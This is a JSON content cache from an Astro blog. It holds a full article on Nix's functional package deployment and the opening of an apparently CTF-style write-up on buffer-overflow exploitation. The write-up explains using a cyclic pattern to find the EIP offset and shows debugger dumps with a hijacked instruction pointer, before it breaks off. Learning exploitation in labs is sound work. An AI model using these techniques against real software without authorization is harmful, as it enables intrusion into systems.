[["Map",1,2,9,10],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.17.1","content-config-digest","583784e648724777","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":false,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[],\"responsiveStyles\":false},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":{\"type\":\"shiki\",\"excludeLangs\":[\"math\"]},\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[],\"rehypePlugins\":[],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true,\"allowedDomains\":[]},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false,\"liveContentCollections\":false,\"csp\":false,\"staticImportMetaEnv\":false,\"chromeDevtoolsWorkspace\":false,\"failOnPrerenderConflict\":false,\"svgo\":false},\"legacy\":{\"collections\":false}}","blog",["Map",11,12,84,85,102,103,149,150,196,197,214,215,315,316,367,368,437,438,473,474,538,539,626,627,743,744,773,774],"nix",{"id":11,"data":13,"body":16,"filePath":17,"digest":18,"rendered":19},{"title":14,"date":15},"The Deployment Gap: From Your Machine to Theirs",["Date","2025-08-27T00:00:00.000Z"],"# The Deployment Gap: From Your Machine to Theirs\r\n\r\nSo you've built some amazing software. It runs beautifully on your machine,flawless, fast, and bug-free. You package it up, send it out into the world, and then the emails start pouring in: _\"It crashes on startup.\"_ _\"I'm getting a weird error.\"_ _\"It doesn't work.\"_\"Your SAAS sucks \" .\r\n\r\nHow is this possible? Your software was perfect.(atleast the LLM said so)\r\n\r\nThis frustrating gap between your machine and a user's machine is the central problem of software deployment. It can be traced back to two things mostly : environment issues and manageability issues.\r\n\r\n\r\n![](/images/posts/nix/screenshot-1755422412.png)\r\n\r\n\r\n## I. Environment-Induced Failures\r\n\r\nThese failures arise from mismatches between the development environment and the user's environment. A program that depends on a certain library version may encounter errors when that library is missing or replaced with a different one. An application tested on one operating system may falter on another due to differences in kernels, filesystems, or system calls. Even small variations in system state environment variables, permissions, locales, or network configurations can derail execution.\r\n(flashbacks of setting up GCC in codeblocks :( )\r\n\r\n\r\nThe troubling aspect of these failures is that they occur even when the application code itself is correct. The software logic is sound, yet the surrounding environment conspires to break it.\r\n\r\n## II. Lifecycle Management Deficiencies\r\n\r\nDeployment issues extend beyond installation into the ongoing care and feeding of software. Updates that are not atomic may leave a program half-upgraded and unusable, with no reliable way to roll back. Uninstallations are often incomplete, scattering configuration files and leftover data across the system. Over time, these remnants accumulate into cruft that burdens stability and maintainability.\r\n\r\n![](/images/posts/nix/screenshot-1755422327.png)\r\n\r\nPerhaps most notoriously, multiple applications may demand different, mutually incompatible versions of the same shared library. When this conflict occurs, one program's gain is another's crash, leaving the system as a whole unstable.\r\n![](/images/posts/nix/3.png)\r\n\r\n\r\n---\r\n\r\n# The System as a Solved Graph\r\n\r\n## The Architectural Imperative of the Linux Package Manager\r\n\r\nIf the deployment gap exposes the problems, then the package manager represents one of the most elegant solutions devised to address them. Its central role in Linux and other Unix-like systems is no accident. It arises from a deep architectural philosophy: one that concerns how software is stored and how it is constructed.\r\n\r\n### I. The Unified Filesystem\r\n\r\nThe first principle of this philosophy is the unified filesystem, sometimes described as a global namespace. Rather than bundling each application with its own set of dependencies, Unix integrates all components into a shared hierarchy. Executables are placed in `/usr/bin`, libraries in `/usr/lib`, and configuration files in `/etc`.\r\n\r\nThis design treats the operating system as a single, coherent whole rather than a loose collection of isolated applications. Yet such coherence introduces risk. Without a mechanism to govern the placement and compatibility of files, the system would quickly collapse into chaos. The package manager assumes this responsibility, acting as the arbiter that maintains order within the shared space.\r\n\r\n\r\n\r\n### II. A Commitment to Modularity\r\n\r\nThe second principle is a commitment to modularity and fine-grained reuse. Applications are rarely monolithic; instead, they are typically small executables that rely on dynamically linked libraries for most of their functionality. A single library may serve dozens of programs, and improvements to that library immediately extend to all of them.\r\n\r\nThis design maximizes efficiency but also creates complexity. The system is no longer a collection of independent parts but a tightly woven dependency graph. Keeping this graph consistent, valid, and conflict-free is far too intricate for manual intervention.\r\n\r\nHere again the package manager proves indispensable. It resolves dependencies, prevents conflicts, and ensures that the modular structure of the system remains intact.\r\n\r\n---\r\n\r\n# The Nix Model: A Functional Approach to Deployment\r\n\r\nIn our previous discussion, we examined the core architectural challenges of traditional Unix-like systems: the potential for chaos in shared **global namespaces** and the complex web of **fine-grained dependencies**. These are not minor issues; they are fundamental problems that most deployment tools merely attempt to contain.\r\n\r\nThis brings us to Nix, a system designed from first principles to solve these problems directly. It doesn't just manage the complexity ,it eliminates it by introducing a different, more robust paradigm: the **purely functional deployment model**.\r\n\r\n![](/images/posts/nix/4.png)\r\n\r\n\r\n## The Core Idea: Software as a Pure Function\r\n\r\nThe central innovation of Nix is deceptively simple. Every piece of software, or \"component,\" is stored in its own unique directory within a special location called the Nix store (`/nix/store`). The clever part is the name of that directory. It isn't just `firefox-1.0.4`; it's a path that includes a **cryptographic hash** derived from _every single input_ used to build that component-the source code, its dependencies, the compiler flags, everything.\r\n\r\nA typical path looks like this:\r\n\r\n/nix/store/rwmfbhb2znwp...-firefox-1.0.4\r\n\r\nThis means that if even a single bit changes in any of the inputs, the resulting hash will be different, and the component will be stored in a different location. This enforces the core principle of the functional model: a component is uniquely and completely defined by the inputs used to create it. Think of it like a mathematical function: `build(inputs) = output`. The same inputs will _always_ produce the exact same output.\r\n\r\n## The Practical Consequences of a Functional Model\r\n\r\n\r\n\r\nThis elegant idea has profound consequences that directly address the traditional deployment issues. The long list of contributions from the Nix thesis can be understood as the practical benefits of this core design.\r\n\r\nFirst, it provides **unparalleled reliability and consistency**. Because every component lives in isolation in its own hashed directory, there are no undeclared dependencies and version conflicts are impossible. Firefox built with one version of a library and a text editor built with another can coexist perfectly on the same system, as they occupy entirely different paths in the Nix store. The problems of a shared `/usr/lib` are simply sidestepped.\r\n\r\nSecond, it enables **bulletproof operations**. When you update your system, Nix builds the entire new configuration on the side without touching your running system. The switch to the new version is **atomic**a single, instantaneous operation. If you don't like the update, **rollbacks** are equally trivial and fast, as the old configuration is still present and untouched. The risk associated with a traditional, stateful upgrade process is eliminated.\r\n\r\nFinally, the model offers **immense flexibility and power**. Nix uses a lazy, purely functional language to describe how to build software, which allows for expressing complex configurations and variations in an elegant way. It seamlessly blends source and binary deployment; if a pre-built binary matching a hash exists, Nix downloads it as an optimization. If not, it can build it from source. This model is so robust that it extends beyond simple package management to orchestrating entire services, implementing build farms for continuous integration, and even acting as a superior replacement for build tools like Make.\r\n\r\n## Inside the Nix Store: A World Without Conflicts\r\n\r\nIn the last article, we introduced Nix's **purely functional model** for software deployment the idea that a piece of software should be a predictable output derived from a set of known inputs. But how does Nix enforce this principle at a technical level?\r\n\r\nThe answer lies in a special directory and a clever use of cryptography. Welcome to the **Nix store**.\r\n\r\n### The Anatomy of a Store Path\r\n\r\nAt its core, the Nix store is simply a directory, usually located at `/nix/store`. Inside this directory, every piece of software which Nix calls a **component** lives in its own isolated subdirectory.\r\n\r\nThe most notable feature, and the secret to Nix's power, is the naming convention for these subdirectories. A component isn't just named hello-2.1.1. Instead, it has a long, unique name called a store path:\r\n\r\n/nix/store/bwacc7a5c5n3qx37nz5drwcgd2lv89w6-hello-2.1.1\r\n\r\nThat long string of characters is a **cryptographic hash**-a unique fingerprint computed from _every single input_ used to build the component. This includes:\r\n\r\n- The source code itself.\r\n    \r\n- The build scripts.\r\n    \r\n- All build-time dependencies, like compilers and libraries.\r\n    \r\n- Even the configuration arguments passed to the build.\r\n    \r\n\r\nIf you change even a single byte in any of those inputs, the hash changes, and the component is installed to a completely new path. This single mechanism provides two foundational guarantees that solve the majority of problems in traditional deployment systems.\r\n\r\n### Pillar 1: Total Isolation, Zero Interference\r\n\r\nBecause every component's identity is tied to the exact hash of its inputs, no two distinct components can ever occupy the same path. A program built against one version of a library will have a different hash than the same program built against a newer version.\r\n\r\nThis provides perfect isolation. You can have two versions of the same application, or two applications that depend on conflicting versions of a library, installed side-by-side without any interference. When you \"upgrade\" a component in Nix, you aren't performing a destructive action. The new version is simply built and placed at a new path, leaving the old one entirely untouched. This is what makes upgrades and rollbacks not just safe, but trivial.\r\n\r\n### Pillar 2: Forced Honesty, Perfect Dependencies\r\n\r\nThe second, equally powerful guarantee is the prevention of **undeclared dependencies**. In a traditional system, a build script might look for a library like `libssl` in a global location like `/usr/lib`. If it finds it, the build succeeds, but that dependency might never be formally recorded. The program \"works on your machine\" but fails on another where that library is missing.\r\n\r\nNix solves this by eliminating global locations for dependencies. The Nix store is the _only_ place to look. When building a component, the environment is scrubbed clean. The only way for a build process to find a library like OpenSSL is if its full, unique store path (e.g., `/nix/store/5jq6jgkamxjj...-openssl-0.9.7d`) is explicitly passed as an input.\r\n![](/images/posts/nix/5.png)\r\n## Mechanism for Component Isolation\r\n\r\nThe Nix deployment model guarantees component isolation through a recursive hashing scheme. The store path of any given component is derived from a cryptographic hash of all inputs to its build process. This hash is computed recursively, meaning it incorporates the hashes of all build-time dependencies. The result is a unique identifier for a specific component configuration. Any modification to a component or its dependencies, however minor, alters the hash and thus generates a new, distinct store path. Consequently, the installation or removal of one component configuration has no effect on any other.\r\n\r\n### Non-Destructive Operations\r\n\r\nThis architecture ensures that all operations are non-destructive. For example, consider two versions of Subversion, where version 1.2.0 depends on a newer version of OpenSSL than its predecessor. The installation of Subversion 1.2.0 results in the addition of both the new Subversion and the new OpenSSL to the Nix store, each at a new, unique store path. The prior installation of Subversion and its corresponding OpenSSL dependency remain in the store, unaltered and fully functional. The old application continues to reference the old library, completely insulated from the new installation.\r\n\r\n### Dependency Propagation and Immutability\r\n\r\nChanges propagate deterministically through the dependency graph. An update to a foundational library, such as GTK, will change its hash. This change recursively propagates to every component that depends on GTK, such as Firefox, which will in turn be rebuilt and assigned a new store path. Components that do not have a dependency on GTK, such as Glibc, are unaffected.\r\n\r\nA critical aspect of this model is the immutability of components. Once a component is built and placed in the store, it is marked as read-only and is never modified. An \"upgrade\" is not a modification but the creation of a new component. This directly mirrors the principles of purely functional programming, where the output of a function is determined exclusively by its inputs. In Nix, the contents of a component are determined exclusively by its build-time inputs, providing a strong guarantee of non-interference.\r\n\r\n\r\n###  A solved problem \r\nTraditional package managers, born from the Unix philosophy o\r\nf shared, modular components, brought order to the chaos but never eliminated the underlying fragility. They manage the state, but the state remains mutable and prone to entropy.\r\n\r\nNix represents a paradigm shift. It reframes deployment not as a series of imperative actions to be performed, but as a **declarative** goal to be achieved. By adopting a purely functional model, Nix treats software and entire system configurations as immutable, reproducible values. The cryptographic hash is not just a clever trick; it is the mechanism that provides a mathematical guarantee of consistency-a guarantee that traditional systems simply cannot offer.\r\n\r\nThis approach transforms the fragile art of system administration into a solved engineering problem. It provides a foundation for truly reliable, reproducible, and robust systems, moving us beyond simply managing complexity and toward eliminating it altogether.","src/content/blog/nix.md","7721c4a8a2972f43",{"html":20,"metadata":21},"\u003Ch1 id=\"the-deployment-gap-from-your-machine-to-theirs\">The Deployment Gap: From Your Machine to Theirs\u003C/h1>\n\u003Cp>So you’ve built some amazing software. It runs beautifully on your machine,flawless, fast, and bug-free. You package it up, send it out into the world, and then the emails start pouring in: \u003Cem>“It crashes on startup.”\u003C/em> \u003Cem>“I’m getting a weird error.”\u003C/em> \u003Cem>“It doesn’t work.\"\u003C/em>\"Your SAAS sucks ” .\u003C/p>\n\u003Cp>How is this possible? Your software was perfect.(atleast the LLM said so)\u003C/p>\n\u003Cp>This frustrating gap between your machine and a user’s machine is the central problem of software deployment. It can be traced back to two things mostly : environment issues and manageability issues.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nix/screenshot-1755422412.png\" alt=\"\">\u003C/p>\n\u003Ch2 id=\"i-environment-induced-failures\">I. Environment-Induced Failures\u003C/h2>\n\u003Cp>These failures arise from mismatches between the development environment and the user’s environment. A program that depends on a certain library version may encounter errors when that library is missing or replaced with a different one. An application tested on one operating system may falter on another due to differences in kernels, filesystems, or system calls. Even small variations in system state environment variables, permissions, locales, or network configurations can derail execution.\r\n(flashbacks of setting up GCC in codeblocks :( )\u003C/p>\n\u003Cp>The troubling aspect of these failures is that they occur even when the application code itself is correct. The software logic is sound, yet the surrounding environment conspires to break it.\u003C/p>\n\u003Ch2 id=\"ii-lifecycle-management-deficiencies\">II. Lifecycle Management Deficiencies\u003C/h2>\n\u003Cp>Deployment issues extend beyond installation into the ongoing care and feeding of software. Updates that are not atomic may leave a program half-upgraded and unusable, with no reliable way to roll back. Uninstallations are often incomplete, scattering configuration files and leftover data across the system. Over time, these remnants accumulate into cruft that burdens stability and maintainability.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nix/screenshot-1755422327.png\" alt=\"\">\u003C/p>\n\u003Cp>Perhaps most notoriously, multiple applications may demand different, mutually incompatible versions of the same shared library. When this conflict occurs, one program’s gain is another’s crash, leaving the system as a whole unstable.\r\n\u003Cimg src=\"/images/posts/nix/3.png\" alt=\"\">\u003C/p>\n\u003Chr>\n\u003Ch1 id=\"the-system-as-a-solved-graph\">The System as a Solved Graph\u003C/h1>\n\u003Ch2 id=\"the-architectural-imperative-of-the-linux-package-manager\">The Architectural Imperative of the Linux Package Manager\u003C/h2>\n\u003Cp>If the deployment gap exposes the problems, then the package manager represents one of the most elegant solutions devised to address them. Its central role in Linux and other Unix-like systems is no accident. It arises from a deep architectural philosophy: one that concerns how software is stored and how it is constructed.\u003C/p>\n\u003Ch3 id=\"i-the-unified-filesystem\">I. The Unified Filesystem\u003C/h3>\n\u003Cp>The first principle of this philosophy is the unified filesystem, sometimes described as a global namespace. Rather than bundling each application with its own set of dependencies, Unix integrates all components into a shared hierarchy. Executables are placed in \u003Ccode>/usr/bin\u003C/code>, libraries in \u003Ccode>/usr/lib\u003C/code>, and configuration files in \u003Ccode>/etc\u003C/code>.\u003C/p>\n\u003Cp>This design treats the operating system as a single, coherent whole rather than a loose collection of isolated applications. Yet such coherence introduces risk. Without a mechanism to govern the placement and compatibility of files, the system would quickly collapse into chaos. The package manager assumes this responsibility, acting as the arbiter that maintains order within the shared space.\u003C/p>\n\u003Ch3 id=\"ii-a-commitment-to-modularity\">II. A Commitment to Modularity\u003C/h3>\n\u003Cp>The second principle is a commitment to modularity and fine-grained reuse. Applications are rarely monolithic; instead, they are typically small executables that rely on dynamically linked libraries for most of their functionality. A single library may serve dozens of programs, and improvements to that library immediately extend to all of them.\u003C/p>\n\u003Cp>This design maximizes efficiency but also creates complexity. The system is no longer a collection of independent parts but a tightly woven dependency graph. Keeping this graph consistent, valid, and conflict-free is far too intricate for manual intervention.\u003C/p>\n\u003Cp>Here again the package manager proves indispensable. It resolves dependencies, prevents conflicts, and ensures that the modular structure of the system remains intact.\u003C/p>\n\u003Chr>\n\u003Ch1 id=\"the-nix-model-a-functional-approach-to-deployment\">The Nix Model: A Functional Approach to Deployment\u003C/h1>\n\u003Cp>In our previous discussion, we examined the core architectural challenges of traditional Unix-like systems: the potential for chaos in shared \u003Cstrong>global namespaces\u003C/strong> and the complex web of \u003Cstrong>fine-grained dependencies\u003C/strong>. These are not minor issues; they are fundamental problems that most deployment tools merely attempt to contain.\u003C/p>\n\u003Cp>This brings us to Nix, a system designed from first principles to solve these problems directly. It doesn’t just manage the complexity ,it eliminates it by introducing a different, more robust paradigm: the \u003Cstrong>purely functional deployment model\u003C/strong>.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/nix/4.png\" alt=\"\">\u003C/p>\n\u003Ch2 id=\"the-core-idea-software-as-a-pure-function\">The Core Idea: Software as a Pure Function\u003C/h2>\n\u003Cp>The central innovation of Nix is deceptively simple. Every piece of software, or “component,” is stored in its own unique directory within a special location called the Nix store (\u003Ccode>/nix/store\u003C/code>). The clever part is the name of that directory. It isn’t just \u003Ccode>firefox-1.0.4\u003C/code>; it’s a path that includes a \u003Cstrong>cryptographic hash\u003C/strong> derived from \u003Cem>every single input\u003C/em> used to build that component-the source code, its dependencies, the compiler flags, everything.\u003C/p>\n\u003Cp>A typical path looks like this:\u003C/p>\n\u003Cp>/nix/store/rwmfbhb2znwp…-firefox-1.0.4\u003C/p>\n\u003Cp>This means that if even a single bit changes in any of the inputs, the resulting hash will be different, and the component will be stored in a different location. This enforces the core principle of the functional model: a component is uniquely and completely defined by the inputs used to create it. Think of it like a mathematical function: \u003Ccode>build(inputs) = output\u003C/code>. The same inputs will \u003Cem>always\u003C/em> produce the exact same output.\u003C/p>\n\u003Ch2 id=\"the-practical-consequences-of-a-functional-model\">The Practical Consequences of a Functional Model\u003C/h2>\n\u003Cp>This elegant idea has profound consequences that directly address the traditional deployment issues. The long list of contributions from the Nix thesis can be understood as the practical benefits of this core design.\u003C/p>\n\u003Cp>First, it provides \u003Cstrong>unparalleled reliability and consistency\u003C/strong>. Because every component lives in isolation in its own hashed directory, there are no undeclared dependencies and version conflicts are impossible. Firefox built with one version of a library and a text editor built with another can coexist perfectly on the same system, as they occupy entirely different paths in the Nix store. The problems of a shared \u003Ccode>/usr/lib\u003C/code> are simply sidestepped.\u003C/p>\n\u003Cp>Second, it enables \u003Cstrong>bulletproof operations\u003C/strong>. When you update your system, Nix builds the entire new configuration on the side without touching your running system. The switch to the new version is \u003Cstrong>atomic\u003C/strong>a single, instantaneous operation. If you don’t like the update, \u003Cstrong>rollbacks\u003C/strong> are equally trivial and fast, as the old configuration is still present and untouched. The risk associated with a traditional, stateful upgrade process is eliminated.\u003C/p>\n\u003Cp>Finally, the model offers \u003Cstrong>immense flexibility and power\u003C/strong>. Nix uses a lazy, purely functional language to describe how to build software, which allows for expressing complex configurations and variations in an elegant way. It seamlessly blends source and binary deployment; if a pre-built binary matching a hash exists, Nix downloads it as an optimization. If not, it can build it from source. This model is so robust that it extends beyond simple package management to orchestrating entire services, implementing build farms for continuous integration, and even acting as a superior replacement for build tools like Make.\u003C/p>\n\u003Ch2 id=\"inside-the-nix-store-a-world-without-conflicts\">Inside the Nix Store: A World Without Conflicts\u003C/h2>\n\u003Cp>In the last article, we introduced Nix’s \u003Cstrong>purely functional model\u003C/strong> for software deployment the idea that a piece of software should be a predictable output derived from a set of known inputs. But how does Nix enforce this principle at a technical level?\u003C/p>\n\u003Cp>The answer lies in a special directory and a clever use of cryptography. Welcome to the \u003Cstrong>Nix store\u003C/strong>.\u003C/p>\n\u003Ch3 id=\"the-anatomy-of-a-store-path\">The Anatomy of a Store Path\u003C/h3>\n\u003Cp>At its core, the Nix store is simply a directory, usually located at \u003Ccode>/nix/store\u003C/code>. Inside this directory, every piece of software which Nix calls a \u003Cstrong>component\u003C/strong> lives in its own isolated subdirectory.\u003C/p>\n\u003Cp>The most notable feature, and the secret to Nix’s power, is the naming convention for these subdirectories. A component isn’t just named hello-2.1.1. Instead, it has a long, unique name called a store path:\u003C/p>\n\u003Cp>/nix/store/bwacc7a5c5n3qx37nz5drwcgd2lv89w6-hello-2.1.1\u003C/p>\n\u003Cp>That long string of characters is a \u003Cstrong>cryptographic hash\u003C/strong>-a unique fingerprint computed from \u003Cem>every single input\u003C/em> used to build the component. This includes:\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>The source code itself.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>The build scripts.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>All build-time dependencies, like compilers and libraries.\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Even the configuration arguments passed to the build.\u003C/p>\n\u003C/li>\n\u003C/ul>\n\u003Cp>If you change even a single byte in any of those inputs, the hash changes, and the component is installed to a completely new path. This single mechanism provides two foundational guarantees that solve the majority of problems in traditional deployment systems.\u003C/p>\n\u003Ch3 id=\"pillar-1-total-isolation-zero-interference\">Pillar 1: Total Isolation, Zero Interference\u003C/h3>\n\u003Cp>Because every component’s identity is tied to the exact hash of its inputs, no two distinct components can ever occupy the same path. A program built against one version of a library will have a different hash than the same program built against a newer version.\u003C/p>\n\u003Cp>This provides perfect isolation. You can have two versions of the same application, or two applications that depend on conflicting versions of a library, installed side-by-side without any interference. When you “upgrade” a component in Nix, you aren’t performing a destructive action. The new version is simply built and placed at a new path, leaving the old one entirely untouched. This is what makes upgrades and rollbacks not just safe, but trivial.\u003C/p>\n\u003Ch3 id=\"pillar-2-forced-honesty-perfect-dependencies\">Pillar 2: Forced Honesty, Perfect Dependencies\u003C/h3>\n\u003Cp>The second, equally powerful guarantee is the prevention of \u003Cstrong>undeclared dependencies\u003C/strong>. In a traditional system, a build script might look for a library like \u003Ccode>libssl\u003C/code> in a global location like \u003Ccode>/usr/lib\u003C/code>. If it finds it, the build succeeds, but that dependency might never be formally recorded. The program “works on your machine” but fails on another where that library is missing.\u003C/p>\n\u003Cp>Nix solves this by eliminating global locations for dependencies. The Nix store is the \u003Cem>only\u003C/em> place to look. When building a component, the environment is scrubbed clean. The only way for a build process to find a library like OpenSSL is if its full, unique store path (e.g., \u003Ccode>/nix/store/5jq6jgkamxjj...-openssl-0.9.7d\u003C/code>) is explicitly passed as an input.\r\n\u003Cimg src=\"/images/posts/nix/5.png\" alt=\"\">\u003C/p>\n\u003Ch2 id=\"mechanism-for-component-isolation\">Mechanism for Component Isolation\u003C/h2>\n\u003Cp>The Nix deployment model guarantees component isolation through a recursive hashing scheme. The store path of any given component is derived from a cryptographic hash of all inputs to its build process. This hash is computed recursively, meaning it incorporates the hashes of all build-time dependencies. The result is a unique identifier for a specific component configuration. Any modification to a component or its dependencies, however minor, alters the hash and thus generates a new, distinct store path. Consequently, the installation or removal of one component configuration has no effect on any other.\u003C/p>\n\u003Ch3 id=\"non-destructive-operations\">Non-Destructive Operations\u003C/h3>\n\u003Cp>This architecture ensures that all operations are non-destructive. For example, consider two versions of Subversion, where version 1.2.0 depends on a newer version of OpenSSL than its predecessor. The installation of Subversion 1.2.0 results in the addition of both the new Subversion and the new OpenSSL to the Nix store, each at a new, unique store path. The prior installation of Subversion and its corresponding OpenSSL dependency remain in the store, unaltered and fully functional. The old application continues to reference the old library, completely insulated from the new installation.\u003C/p>\n\u003Ch3 id=\"dependency-propagation-and-immutability\">Dependency Propagation and Immutability\u003C/h3>\n\u003Cp>Changes propagate deterministically through the dependency graph. An update to a foundational library, such as GTK, will change its hash. This change recursively propagates to every component that depends on GTK, such as Firefox, which will in turn be rebuilt and assigned a new store path. Components that do not have a dependency on GTK, such as Glibc, are unaffected.\u003C/p>\n\u003Cp>A critical aspect of this model is the immutability of components. Once a component is built and placed in the store, it is marked as read-only and is never modified. An “upgrade” is not a modification but the creation of a new component. This directly mirrors the principles of purely functional programming, where the output of a function is determined exclusively by its inputs. In Nix, the contents of a component are determined exclusively by its build-time inputs, providing a strong guarantee of non-interference.\u003C/p>\n\u003Ch3 id=\"a-solved-problem\">A solved problem\u003C/h3>\n\u003Cp>Traditional package managers, born from the Unix philosophy o\r\nf shared, modular components, brought order to the chaos but never eliminated the underlying fragility. They manage the state, but the state remains mutable and prone to entropy.\u003C/p>\n\u003Cp>Nix represents a paradigm shift. It reframes deployment not as a series of imperative actions to be performed, but as a \u003Cstrong>declarative\u003C/strong> goal to be achieved. By adopting a purely functional model, Nix treats software and entire system configurations as immutable, reproducible values. The cryptographic hash is not just a clever trick; it is the mechanism that provides a mathematical guarantee of consistency-a guarantee that traditional systems simply cannot offer.\u003C/p>\n\u003Cp>This approach transforms the fragile art of system administration into a solved engineering problem. It provides a foundation for truly reliable, reproducible, and robust systems, moving us beyond simply managing complexity and toward eliminating it altogether.\u003C/p>",{"headings":22,"localImagePaths":79,"remoteImagePaths":80,"frontmatter":81,"imagePaths":83},[23,26,30,33,36,39,43,46,49,52,55,58,61,64,67,70,73,76],{"depth":24,"slug":25,"text":14},1,"the-deployment-gap-from-your-machine-to-theirs",{"depth":27,"slug":28,"text":29},2,"i-environment-induced-failures","I. Environment-Induced Failures",{"depth":27,"slug":31,"text":32},"ii-lifecycle-management-deficiencies","II. Lifecycle Management Deficiencies",{"depth":24,"slug":34,"text":35},"the-system-as-a-solved-graph","The System as a Solved Graph",{"depth":27,"slug":37,"text":38},"the-architectural-imperative-of-the-linux-package-manager","The Architectural Imperative of the Linux Package Manager",{"depth":40,"slug":41,"text":42},3,"i-the-unified-filesystem","I. The Unified Filesystem",{"depth":40,"slug":44,"text":45},"ii-a-commitment-to-modularity","II. A Commitment to Modularity",{"depth":24,"slug":47,"text":48},"the-nix-model-a-functional-approach-to-deployment","The Nix Model: A Functional Approach to Deployment",{"depth":27,"slug":50,"text":51},"the-core-idea-software-as-a-pure-function","The Core Idea: Software as a Pure Function",{"depth":27,"slug":53,"text":54},"the-practical-consequences-of-a-functional-model","The Practical Consequences of a Functional Model",{"depth":27,"slug":56,"text":57},"inside-the-nix-store-a-world-without-conflicts","Inside the Nix Store: A World Without Conflicts",{"depth":40,"slug":59,"text":60},"the-anatomy-of-a-store-path","The Anatomy of a Store Path",{"depth":40,"slug":62,"text":63},"pillar-1-total-isolation-zero-interference","Pillar 1: Total Isolation, Zero Interference",{"depth":40,"slug":65,"text":66},"pillar-2-forced-honesty-perfect-dependencies","Pillar 2: Forced Honesty, Perfect Dependencies",{"depth":27,"slug":68,"text":69},"mechanism-for-component-isolation","Mechanism for Component Isolation",{"depth":40,"slug":71,"text":72},"non-destructive-operations","Non-Destructive Operations",{"depth":40,"slug":74,"text":75},"dependency-propagation-and-immutability","Dependency Propagation and Immutability",{"depth":40,"slug":77,"text":78},"a-solved-problem","A solved problem",[],[],{"title":14,"date":82},"2025-08-27",[],"ropfu",{"id":84,"data":86,"body":90,"filePath":91,"digest":92,"rendered":93},{"title":87,"date":88,"excerpt":89},"Oops, Your Control Flow Is Mine",["Date","2025-12-29T00:00:00.000Z"],"A deep dive into buffer overflow exploitation using cyclic patterns, EIP control, and ROP techniques to achieve arbitrary code execution.","Initially, observed application behavior indicated a classic buffer overflow vulnerability. Supplying an oversized input string consistently led to a segmentation fault. Debugger analysis at this failure point confirmed EIP register corruption, signifying that our input had successfully diverted the execution flow-though without specific direction.\r\n\r\nTo gain this specific direction, a precise instrument was required: the cyclic pattern. This specially crafted string is designed with a fundamental property: every 4-byte (for 32-bit systems) or 8-byte (for 64-bit systems) sequence embedded within it is unique. This characteristic enables a direct correlation between any captured register value and its exact original position within the pattern. A pattern of sufficient length, typically 500 bytes, was generated and delivered as the payload, reliably reproducing the crash.\r\n\r\n```\r\n[ Legend: Modified register | Code | Heap | Stack | String ]\r\n─────────────────────────────────────────────────────────────── registers ────\r\n$eax   : 0xfffffe00\r\n$ebx   : 0x0       \r\n$ecx   : 0x080e8330  →  0x00000000\r\n$edx   : 0x400     \r\n$esp   : 0xffffa470  →  0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000\r\n$ebp   : 0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000\r\n$esi   : 0x0       \r\n$edi   : 0x080e5300  →  \u003C_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah\r\n$eip   : 0xf7ffc5b9  →  \u003C__kernel_vsyscall+0009> pop ebp\r\n$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]\r\n$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 \r\n─────────────────────────────────────────────────────────────────── stack ────\r\n0xffffa470│+0x0000: 0xffffa508  →  0xffffa568  →  0xffffa598  →  0xffffa5b8  →  0x00000000\t← $esp\r\n0xffffa474│+0x0004: 0x00000400\r\n0xffffa478│+0x0008: 0x080e8330  →  0x00000000\r\n0xffffa47c│+0x000c: 0x0806ed0b  →  \u003Cread+002b> mov ebx, eax\r\n0xffffa480│+0x0010: 0x080e5300  →  \u003C_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah\r\n0xffffa484│+0x0014: 0x080e6140  →  \u003C_IO_file_jumps+0000> add BYTE PTR [eax], al\r\n[ Legend: Modified register | Code | Heap | Stack | String ]\r\n─────────────────────────────────────────────────────────────── registers ────\r\n$eax   : 0xffffa580  →  \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]\"\r\n$ebx   : 0x61616166 (\"faaa\"?)\r\n$ecx   : 0x080e5300  →  \u003C_IO_2_1_stdin_+0000> mov BYTE PTR [edx], ah\r\n$edx   : 0xffffa601  →  0x00000000\r\n$esp   : 0xffffa5a0  →  \"iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]\"\r\n$ebp   : 0x61616167 (\"gaaa\"?)\r\n$esi   : 0x080e5000  →  \u003C_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al\r\n$edi   : 0x080e5000  →  \u003C_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al\r\n$eip   : 0x61616168 (\"haaa\"?)\r\n$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]\r\n$cs: 